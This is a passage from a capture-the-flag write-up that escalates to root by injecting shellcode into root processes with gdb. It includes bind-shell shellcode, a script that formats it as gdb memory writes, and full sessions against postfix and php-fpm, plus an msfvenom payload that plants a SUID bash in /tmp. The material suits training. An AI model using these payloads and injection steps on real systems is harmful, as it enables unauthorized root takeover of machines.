I’m going to write this directly into memory, and I need to do that as integers. I’ll write a quick python script that takes bytes eight at a time, switches the byte order, and prints them out in the format `gdb` expects:

```

#!/usr/bin/env python3

buf = b"\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

buf = b"\x90" * (16 - (len(buf) % 8)) + buf

for i in range(0, len(buf), 8):
    chunk = buf[i:i+8][::-1]
    print(f"set {{long}}($rip+{i}) = 0x" + ''.join([f'{byte:02x}' for byte in chunk]))

```

At the start, I’m going to add some no-op (NOP, or `\x90`) bytes at the front of the command so that `gdb` can execute through them into my shellcode. I also want the length to be evenly divisible by eight, so I’ll use that to figure out how many NOPs to add. Then I’ll break the buffer into eight-byte chunks.

For each chunk, I’ll reverse the byte order, and then print the string I need. The list comprehension (`[f'{byte:02x}' for byte in chunk]`) loops over each byte, converting it to a zero-padded two-byte hex string, and then `join` bring them all together into a single string.

This prints the following:

```

oxdf@hacky$ python3 format_shellcode.py 
set {long}($rip+0) = 0x9090909090909090
set {long}($rip+8) = 0x48d23148c0314890
set {long}($rip+16) = 0x6a58296ac6fff631
set {long}($rip+24) = 0x026a9748050f5f02
set {long}($rip+32) = 0x54e015022444c766
set {long}($rip+40) = 0x5a106a58316a525e
set {long}($rip+48) = 0x050f58326a5e050f
set {long}($rip+56) = 0x6a9748050f582b6a
set {long}($rip+64) = 0x050f21b0ceff5e03
set {long}($rip+72) = 0x2fbb4852e6f7f875
set {long}($rip+80) = 0x5368732f2f6e6962
set {long}($rip+88) = 0x050f3bb0243c8d48
set {long}($rip+96) = 0xcccccccccccccccc

```

#### Inject

I’ll find a process running as root to attach to with `ps auxww | grep root`. It will fail often, and seem stuck. I’ll get out by entering `ctrl-z` to background `gdb`, and then `kill -9 $(jobs -p)` (often two or three times) to kill background jobs.

For example, I’ll work with the `postfix` process, as it’s a mail server, and likely not critical for this box:

```

root        1655  0.0  0.2  38072  4512 ?        Ss   18:22   0:00 /usr/lib/postfix/sbin/master -w

```

I’ll attach `gdb` to it using the `-p` option to give the PID, and `-q` to prevent a bunch of useless printed stuff:

```

developer@faculty:~$ gdb -q -p 1655
Attaching to process 1655
Reading symbols from /usr/lib/postfix/sbin/master...
(No debugging symbols found in /usr/lib/postfix/sbin/master)
Reading symbols from /lib64/ld-linux-x86-64.so.2...
Reading symbols from /usr/lib/debug/.build-id/45/87364908de169dec62ffa538170118c1c3a078.debug...
0x00007f96ea034467 in _start () from /lib64/ld-linux-x86-64.so.2
(gdb) 

```

Now I’ll paste in my shellcode, followed by `c` to continue:

```

(gdb) set {long}($rip+0) = 0x9090909090909090
(gdb) set {long}($rip+8) = 0x48d23148c0314890
(gdb) set {long}($rip+16) = 0x6a58296ac6fff631
(gdb) set {long}($rip+24) = 0x026a9748050f5f02
(gdb) set {long}($rip+32) = 0x54e015022444c766
(gdb) set {long}($rip+40) = 0x5a106a58316a525e
(gdb) set {long}($rip+48) = 0x050f58326a5e050f
(gdb) set {long}($rip+56) = 0x6a9748050f582b6a
(gdb) set {long}($rip+64) = 0x050f21b0ceff5e03
(gdb) set {long}($rip+72) = 0x2fbb4852e6f7f875
(gdb) set {long}($rip+80) = 0x5368732f2f6e6962
(gdb) set {long}($rip+88) = 0x050f3bb0243c8d48
(gdb) set {long}($rip+96) = 0xcccccccccccccccc
(gdb) c

```

I’ll get another SSH session and run `netstat`:

```

developer@faculty:~$ netstat -tnlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:5600            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 ::1:25                  :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -   

```

There’s now something listening on 5600.

Connecting, it gives a shell:

```

developer@faculty:~$ nc 127.0.0.1 5600
id
uid=0(root) gid=0(root) groups=0(root)

```

I’ll upgrade the shell:

```

script /dev/null -c bash
Script started, file is /dev/null
root@faculty:/var/spool/postfix# ^Z
[1]+  Stopped                 nc 127.0.0.1 5600
developer@faculty:~$ stty raw -echo; fg
nc 127.0.0.1 5600
                 reset
reset: unknown terminal type unknown
Terminal type? screen
root@faculty:/var/spool/postfix# 

```

And grab the final flag:

```

root@faculty:/root# cat root.txt
3298e0ab************************

```

#### Alternative Shellcode

I could also make some shellcode using `msfvenom` to execute commands. This one will make `bash` copy that’s SUID to run as root:

```

oxdf@hacky$ msfvenom -p linux/x64/exec CMD='cp /bin/bash /tmp/df; chmod 4777 /tmp/df' -f python
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 77 bytes
Final size of python file: 385 bytes
buf =  b""
buf += b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54"
buf += b"\x5f\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x29\x00\x00"
buf += b"\x00\x63\x70\x20\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68"
buf += b"\x20\x2f\x74\x6d\x70\x2f\x64\x66\x3b\x20\x63\x68\x6d"
buf += b"\x6f\x64\x20\x34\x37\x37\x37\x20\x2f\x74\x6d\x70\x2f"
buf += b"\x64\x66\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05"

```

I’m putting the SetUID `bash` in `/tmp` because `/dev/shm` is mounted with `nosuid`, which means it won’t respect the setUID bit (can see this in the `mount` output).

In the Python script to reformat it:

```

#!/usr/bin/env python3

buf =  b""
buf += b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54"
buf += b"\x5f\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x29\x00\x00"
buf += b"\x00\x63\x70\x20\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68"
buf += b"\x20\x2f\x74\x6d\x70\x2f\x64\x66\x3b\x20\x63\x68\x6d"
buf += b"\x6f\x64\x20\x34\x37\x37\x37\x20\x2f\x74\x6d\x70\x2f"
buf += b"\x64\x66\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05"

buf += b"\xcc" * 8
buf = b"\x90" * (16 - (len(buf) % 8)) + buf
chunks = [buf[i:i+8] for i in range(0, len(buf), 8)]

for i in range(0, len(buf), 8):
    chunk = buf[i:i+8][::-1]
    print(f"set ($rip+{i}) = 0x" + ''.join([f'{byte:02x}' for byte in chunk]))

```

It generates the commands:

```

oxdf@hacky$ python3 format_shellcode.py 
set {long}($rip+0) = 0x9090909090909090
set {long}($rip+8) = 0x69622fb848909090
set {long}($rip+16) = 0x5450990068732f6e
set {long}($rip+24) = 0x5e54632d6866525f
set {long}($rip+32) = 0x706300000029e852
set {long}($rip+40) = 0x61622f6e69622f20
set {long}($rip+48) = 0x2f706d742f206873
set {long}($rip+56) = 0x6f6d6863203b6664
set {long}($rip+64) = 0x2f20373737342064
set {long}($rip+72) = 0x560066642f706d74
set {long}($rip+80) = 0x050f583b6a5e5457
set {long}($rip+88) = 0xcccccccccccccccc

```

Now I’ll just attach and send the commands:

```

developer@faculty:~$ gdb -q -p 849
Attaching to process 849
Reading symbols from /usr/sbin/php-fpm7.4...
(No debugging symbols found in /usr/sbin/php-fpm7.4)
Reading symbols from /lib64/ld-linux-x86-64.so.2...
Reading symbols from /usr/lib/debug/.build-id/45/87364908de169dec62ffa538170118c1c3a078.debug...
0x00007ff9bea8a42a in _start () from /lib64/ld-linux-x86-64.so.2
(gdb) set {long}($rip+0) = 0x9090909090909090
(gdb) set {long}($rip+8) = 0x69622fb848909090
(gdb) set {long}($rip+16) = 0x5450990068732f6e
(gdb) set {long}($rip+24) = 0x5e54632d6866525f
(gdb) set {long}($rip+32) = 0x706300000029e852
(gdb) set {long}($rip+40) = 0x61622f6e69622f20
(gdb) set {long}($rip+48) = 0x2f706d742f206873
(gdb) set {long}($rip+56) = 0x6f6d6863203b6664
(gdb) set {long}($rip+64) = 0x2f20373737342064
(gdb) set {long}($rip+72) = 0x560066642f706d74
(gdb) set {long}($rip+80) = 0x050f583b6a5e5457
(gdb) set {long}($rip+88) = 0xcccccccccccccccc
(gdb) c
Continuing.
process 849 is executing new program: /usr/bin/dash
warning: Probes-based dynamic linker interface failed.
Reverting to original interface.
[Detaching after fork from child process 3874]
[Detaching after fork from child process 3875]
[Inferior 1 (process 849) exited normally]
(gdb) q
developer@faculty:~$

```

The file exists, and returns a root shell (I’ll need `-p` to tell `bash` not to drop privs):

```

developer@faculty:~$ /tmp/df -p
uid=1001(developer) gid=1002(developer) euid=0(root) groups=1002(developer),1001(debug),1003(faculty)

```

The effective user id (`euid`) is root, which is good enough to get access to all things on the system. See [this post](/2022/05/31/setuid-rabbithole.html) for details on different kinds of user ids.